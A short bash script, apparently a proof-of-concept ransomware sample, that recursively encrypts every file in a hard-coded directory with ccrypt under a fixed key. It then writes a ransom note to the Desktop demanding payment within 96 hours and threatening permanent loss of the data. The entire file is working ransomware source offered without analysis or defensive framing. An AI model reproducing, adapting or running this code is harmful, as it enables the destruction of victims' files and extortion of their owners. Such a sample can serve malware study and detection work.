#! /bin/bash

#Author: Vasisht Duddu(@vduddu)

#Change the key
secret_key='somerandomkey'
pwd=`PWD`
root_dir='/Users/vduddu/Desktop/Secret'
cd $root_dir
list=$(ls -l -R | grep '^-' | awk '{print $9}')
number=$(ls -l -R | grep '^-' | awk '{print $9}' | wc -l)

for i in `seq 1 $number`
do
filename=$(echo $list | awk -v x=$i '{print $x}')
out=`find $PWD -name $filename`
dirnam=${out%/*}
echo "Encrypting: "; echo $filename
ccrypt -f -q -e $filename -K $secret_key
done

cd ~/Desktop
message='Greetings!!!

Your documents, photos, databases and other important files have been encrypted with the strongest encryption with unique key generated for this computer.

Private decryption key is stored on a secret server and the files cannot be decrypted without the key which you will get only if you make the payment.

You have 96 hours to submit the payment. If you do not send the money within the specified time your data will permenently be encrypted and nobody will be able to decrypt them.'
echo $message > ransomware.txt
cd $pwd
